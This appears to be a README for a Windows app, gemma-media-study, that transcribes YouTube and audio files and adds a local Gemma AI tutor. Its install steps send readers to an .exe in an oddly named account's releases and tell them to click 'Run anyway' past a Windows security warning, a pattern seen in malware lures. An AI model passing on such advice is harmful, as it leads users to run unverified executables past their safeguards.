# 🧠 gemma-media-study - Master video content with AI precision

[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rosalinedimensional886/gemma-media-study/releases)

gemma-media-study is a desktop program for Windows. It helps you learn from YouTube videos and audio files. The app records subtitles, breaks down videos frame by frame, and provides an AI tutor to answer your questions. Everything runs on your computer. Your data stays private.

## 📥 How to download the app

Go to the [official release page](https://github.com/Rosalinedimensional886/gemma-media-study/releases) to get the software. Look for the file ending in .exe. Save this file to your computer.

## 🖥️ System requirements

Your computer needs to meet these basic standards to run the app well:

* Windows 10 or Windows 11.
* A processor with at least 4 cores.
* 8 GB of RAM or more.
* 5 GB of free disk space for the app and AI models.
* An active internet connection for initial setup and downloading video content.

## ⚙️ Installation steps

1. Locate the .exe file you downloaded.
2. Double-click the file to start the installer.
3. Follow the prompts on the screen.
4. If a security window appears, click More info and then Run anyway.
5. Once the installer finishes, the app will open automatically.

## 🚀 Setting up the AI

The app uses a tool called Ollama to run the Gemma AI model. During the first launch, the app sets up the connection for you. 

1. Wait for the app to finish the background setup.
2. The app checks for the required AI files.
3. If this is your first time, the program downloads the Gemma model. This file size is about 4 GB. 
4. A progress bar shows you the download status. Do not close the window until it finishes.

## 📖 How to study with your media

The app interface shows a workspace for your videos. 

### Importing content
You can paste a link from YouTube into the URL box. Press Enter to load the video. If you have a local video or audio file, move it into the app window. The app processes the file and generates a transcript.

### Working with subtitles
The app uses Whisper to turn speech into text. You see the text appear alongside the video player. Click on any line of text to jump to that moment in the video. You can highlight text to save it for your notes.

### Using the AI tutor
The chat window sits next to the video. You can ask questions about the material. Type your question and press Send. The AI reads the transcript to give you an answer. It explains complex parts of the lesson or summarizes long videos for you.

## 🛠️ Frequently asked questions

### Can I use the app offline?
Yes, once you download the AI models, the app works without the internet. You only need the internet to fetch new YouTube videos.

### Is the software free?
Yes. The software is open source and does not cost money to use.

### Where does the app save my files?
The app saves your data, transcripts, and chat history in your Documents folder under a new folder named gemma-media-study.

### What should I do if the app runs slow?
Close other programs that use a lot of memory. If you have a dedicated graphics card, make sure your Windows drivers are up to date.
